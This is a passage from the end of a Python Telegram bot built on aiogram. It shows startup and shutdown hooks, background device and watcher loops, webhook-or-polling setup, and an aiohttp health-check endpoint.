        log.info(f"→ {dev_id} to={to}")

    log.info(f"Sent to {len(targets)} device(s) in {(time.time()-t0)*1000:.0f}ms")


async def on_startup(bot: Bot):
    load_cfg()
    _monitor_on["on"] = False
    if CFG["fb_url"]:
        try: await fb_test(CFG["fb_url"])
        except Exception: pass
    asyncio.create_task(device_loop())
    asyncio.create_task(watcher_loop(bot))
    if USE_WEBHOOK:
        await bot.set_webhook(
            url=WEBHOOK_URL,
            allowed_updates=["channel_post", "message", "callback_query"],
            drop_pending_updates=True)
        log.info(f"{BOT_NAME} — webhook: {WEBHOOK_URL}")
    else:
        await bot.delete_webhook(drop_pending_updates=True)
        log.info(f"{BOT_NAME} — polling mode")


async def on_shutdown(bot: Bot):
    if USE_WEBHOOK:
        try: await bot.delete_webhook()
        except Exception: pass
    if _SESSION and not _SESSION.closed:
        await _SESSION.close()


def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)

    if USE_WEBHOOK:
        app = web.Application()
        async def health_check(request):
            return web.Response(text="OK")
        app.router.add_get("/", health_check)
        app.router.add_get("/health", health_check)
        SimpleRequestHandler(dispatcher=dp, bot=bot).register(
            app, path=f"{WEBHOOK_PATH}/{BOT_TOKEN}")
        setup_application(app, dp, bot=bot)
        port = int(os.environ.get("PORT", WEBHOOK_PORT))
        web.run_app(app, host="0.0.0.0", port=port)
    else:
        asyncio.run(dp.start_polling(
            bot,
            allowed_updates=["channel_post", "message", "callback_query"]))


if __name__ == "__main__":
    main()
